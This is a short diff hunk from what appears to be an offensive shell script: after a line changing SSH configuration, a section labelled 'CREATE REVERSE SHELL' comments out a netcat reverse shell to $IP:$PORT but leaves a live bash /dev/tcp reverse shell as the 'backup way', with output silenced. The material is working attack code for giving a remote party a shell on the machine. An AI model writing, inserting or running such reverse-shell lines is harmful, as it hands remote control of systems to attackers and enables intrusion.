@@ -49,7 +49,7 @@ sudo echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
 # CREATE REVERSE SHELL
 
 # FIRST WAY
-nc $IP $PORT -e /bin/$0 > /dev/null 2>&1
+# nc $IP $PORT -e /bin/$0 > /dev/null 2>&1
 
 # BACKUP WAY
 bash -i >& /dev/tcp/$IP/$PORT > /dev/null 2>&1
